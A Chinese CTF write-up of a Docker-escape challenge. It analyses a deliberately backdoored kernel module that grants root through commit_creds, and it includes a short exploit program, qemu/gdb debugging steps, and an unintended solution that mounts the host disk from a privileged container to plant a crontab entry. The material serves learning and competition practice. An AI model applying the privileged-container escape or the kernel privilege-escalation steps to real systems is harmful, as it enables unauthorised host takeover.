---
title: 数字共测CTF docker逃逸
categories:
- 云安全CTF
---
# 数字经济共测大赛线下

## 前言

线下的rw自闭了两天，今天终于有空做一下docker逃逸的题目，也整理一下自己调试的思路，这是一道非常非常非常简单的题目，本来其实也用不到调试的，不过因为自己当局者迷，根本没能静下心好好研究。

## 程序逻辑

题目给了一个虚拟机，内核版本为4.15.0-54-generic，给了一个有漏洞的内核模块de.ko，漏洞主要存在其中，初始化在bss上的hack上分配了一个堆，并用``*(_BYTE *)(hack1 + 8) = 1;``置1，之后给了cred的size大小。

```c
__int64 __fastcall init_module(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 hack1; // rax

  _fentry__(a1, a2);
  v2 = kmalloc_caches[4];
  *(&note + 0x100000000LL) = 0;
  hack1 = kmem_cache_alloc_trace(v2, 0x14000C0LL, 10LL);
  *(_BYTE *)(hack1 + 8) = 1;
  hack = hack1;
  proc_create_data("de", 0x1B6LL, 0LL, &de_proc, 0LL);
  printk("/proc/de created\n", 0x1B6LL);
  printk("size of cred : %ld \n", 0xA8LL);
  return 0LL;
}
```

read函数将``*((_QWORD *)&note + 1)``的指针的内容拷贝给用户，实际上后面可以看到在这里会分配内存

```c
unsigned __int64 __fastcall de_read(__int64 a1, __int64 user_buf)
{
  unsigned __int64 v2; // rdx
  unsigned __int64 v3; // r12
  unsigned __int64 v4; // rbx
  __int64 v5; // r12

  _fentry__(a1, user_buf);
  v3 = v2;
  mutex_lock(&lock);
  printk("/proc/de read\n", user_buf);
  v4 = (unsigned __int8)note;
  if ( (unsigned __int8)note > v3 )
    v4 = v3;
  v5 = *((_QWORD *)&note + 1);
  _check_object_size(*((_QWORD *)&note + 1), v4, 1LL);
  copy_to_user(user_buf, v5, v4);
  mutex_unlock(&lock);
  return v4;
}
```

write函数是我们分析的重点，程序根据我们发送的字符串的第一个字节进行switch case，-1则将用户输入拷贝到*（&note+1），-2则将用户输入拷贝到hack(此时可以覆盖hack+8地址处的值)，不为-3或者*(hack+8)==1会给*(&note+1)处分配一块指定大小的内存，否则(choice==-3且*(hack+8)==0)执行后门代码，弹计算器，如果choice==0则释放*(&note+1)，因此最后只要满足后门条件即可

```c
__int64 __fastcall de_write(__int64 a1, char *from)
{
  char *from_1; // rbx
  __int64 size; // rdx
  __int64 write_size; // r12
  __int64 v5; // rsi
  char v6; // al
  __int64 chunk_addr; // rax
  __int64 v8; // rsi
  __int64 v10; // rax
  unsigned int v11; // eax
  __int64 v12; // r13
  __int64 v13; // r13
  const char *v14; // [rsp-40h] [rbp-40h]
  __int64 v15; // [rsp-38h] [rbp-38h]
  unsigned __int64 v16; // [rsp-30h] [rbp-30h]

  _fentry__(a1, from);
  from_1 = from;
  write_size = size;
  v16 = __readgsqword(0x28u);
  mutex_lock(&lock);
  v5 = (unsigned __int8)*from;
  printk("order:%d", v5);
  v6 = *from_1;
  if ( *from_1 )
  {
    if ( v6 == 0xFFu )                          // write note
    {
      printk("note write\n", v5);
      v13 = *((_QWORD *)&note + 1);
      _check_object_size(*((_QWORD *)&note + 1), write_size - 1, 0LL);// check(dst,count,false)
      copy_from_user(v13, from_1 + 1, write_size - 1);
      printk("write contents compelete\n", from_1 + 1);
    }
    else if ( v6 == 0xFEu )                     // write hack
    {
      printk("note write magic %ld\n", write_size);
      v12 = hack;
      _check_object_size(hack, write_size - 1, 0LL);
      copy_from_user(v12, from_1 + 1, write_size - 1);
    }
    else if ( v6 != 0xFDu || *(_BYTE *)(hack + 8) )
    {
      printk("note malloc\n", v5);
      note = *from_1;
      printk("write size compelete\n", v5);
      chunk_addr = _kmalloc((unsigned __int8)note, 0x14000C0LL);// kmalloc(size,flags)
      v8 = (unsigned __int8)note;
      *((_QWORD *)&note + 1) = chunk_addr;
      printk("malloc size compelete:%d @ %p\n", v8);// leak heap addr
    }
    else
    {
      v10 = prepare_kernel_cred(0LL);           // 0xfd
      commit_creds(v10);
      v14 = "/usr/bin/gnome-calculator";
      v15 = 0LL;
      v11 = call_usermodehelper("/usr/bin/gnome-calculator", &v14, envp_26376, 1LL);
      printk("RC is: %i \n", v11);
    }
  }
  else
  {
    printk("note free\n", v5);
    kfree(*((_QWORD *)&note + 1));              // double free
  }
  mutex_unlock(&lock);
  return write_size;
}
```

## 漏洞利用

先用一次写清空hack+8的值，之后choice=0xfd调用后门弹计算器

## exp.c

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>

int main()
{
    int fd = open("/proc/de",2);
    char *user_buf = (char*)malloc(0x10*sizeof(char));
    user_buf[0] = '\xfe';
    write(fd,user_buf,0x10);
    user_buf[0] = '\xfd';
    write(fd,user_buf,0x1);
    return 0;
}
```

## 调试

进入虚拟机，加载漏洞内核模块，启动docker

```bash
sudo insmod /home/b/de.ko
sudo docker run -itd --privileged -p 0.0.0.0:23:22 d77241e92fe6 /bin/bash -c "/etc/init.d/ssh start;/bin/bash"
```

传输漏洞文件

```bash
scp -P23 ./exp* root@localhost
```

执行exp，成功

![success](./1.jpg)

调试docker好像没有直接的方法，我这里是在宿主系统里找到内核文件(/boot/vmlinuz-4.15.0-54-generic)，拷贝到我的另一台虚拟机上，使用qemu进行调试。

调试脚本如下：

```bash
#! /bin/sh
qemu-system-x86_64 \
-m 256M \
-kernel ./vmlinuz-4.15.0-54-generic \
-initrd  ./initramfs.img \
-append "noexec rdinit=./linuxrc" \
-gdb tcp::1234
```

想要vmlinux的话可以用github的extract脚本提取，这里用不到，启动qemu之后要先查找各种地址

![addr](./2.jpg)

```bash
cat /proc/kallsyms | grep de_write
cat /proc/kallsyms | grep hack
cat /sys/module/de/sections/.text
```

之后启动gdb，``set arch i386:x86-64:intel``设置模拟的架构，``target remote localhost:1234``调试内核，``add-symbol-file ./de.ko 0xffffffffc03b0000``添加符号表，

刚才我们查找到的hack地址为0xffffffffc03b2500，我们断点下在de_write，continue，在qemu里执行exp，可以看到已经能从gdb断住了，*(hack+8)为1

![debug](./3.jpg)

我们再continue一下，第一次的覆写完成，成功改为0

![first](./4.jpg)

在0x118处下个断点(commit_creds)，成功执行到这里，说明exp执行成功

![second](./5.jpg)

## 非预期解

看到知世师傅[知世](https://nightrainy.github.io/2019/10/31/play-with-docker/)的博客，学到了新的姿势。

docker开启–privileged的情况下其实docker的root跟外部物理机的root权限已经差不多了，我们可以通过mount挂载宿主机的磁盘到内部，进而修改/etc/crontab通过定时任务弹计算器，注意要设置环境变量display=0，注意user要是b(普通用户)，display=0的原因可以参见下文[display=0](https://unix.stackexchange.com/questions/193827/what-is-display-0)，因此只需要在/etc/crontab中加一行
```bash
* * * * * b DISPLAY=:0 /usr/bin/gnome-calculator
```
即可每分钟弹一次计算器

![suc](./6.jpg)

## 其他

调试的时候遇到一个问题，%p打印的地址不对，高四字节为0,低四字节不知道是什么，查了之后发现%p输出的是散列值，目地就是不泄漏地址，如果真想输出地址可以用%px，涨知识
